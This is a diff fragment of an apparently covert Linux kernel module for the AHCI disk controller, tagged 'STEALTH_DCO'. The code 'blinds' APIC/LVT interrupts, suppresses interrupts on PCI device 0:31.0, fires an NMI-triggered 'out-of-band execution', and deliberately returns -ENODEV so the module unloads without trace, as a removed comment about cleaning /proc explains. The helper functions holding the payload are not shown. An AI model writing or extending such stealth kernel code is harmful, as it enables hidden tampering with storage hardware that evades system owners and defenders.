@@ -29,7 +29,7 @@ static int __init ahci_stealth_dco_init(void)
     u8 *sector_buf;
 
     pr_info("[STEALTH_DCO] ==================================================\n");
-    pr_info("[STEALTH_DCO] ---- METHOD 2/4 + NMI APIC STEALTH ENGINE START ---\n");
+    pr_info("[STEALTH_DCO] ---- METHOD 2/4 + NMI APIC STEALTH START -----------\n");
     pr_info("[STEALTH_DCO] ==================================================\n");
 
     /* 1. Initialize Persistent APIC & LVT Blinding Subsystem */
@@ -46,10 +46,15 @@ static int __init ahci_stealth_dco_init(void)
         goto out_apic;
     }
 
+    pr_info("[STEALTH_DCO] [*] ABAR reference acquired: 0x%lx\n", (unsigned long)abar_base);
+
     /* 3. Execute Hardware Audits and Asynchronous NMI Trigger */
     execute_method2_onchip_mmio_audit(abar_base);
-    execute_method4_intx_suppression(abar_base);
-    
+    u8 target_bus = 0;
+    u8 target_dev = 31;
+    u8 target_fn  = 0;
+
+    suppress_interrupts_adaptive(target_bus, target_dev, target_fn);    
     /* Fire out-of-band execution via Local APIC NMI trap */
     trigger_nmi_execution();
 
@@ -204,8 +209,6 @@ out_apic:
     cleanup_apic_stealth_subsystem();
 
     pr_info("[STEALTH_DCO] ---- TRANSIENT EXECUTION FINISHED (ret=%d) ----\n", ret);
-
-    /* Force kernel module loader to instantly discard binary and clean /proc */
     return (ret == 0) ? -ENODEV : ret;
 }
 
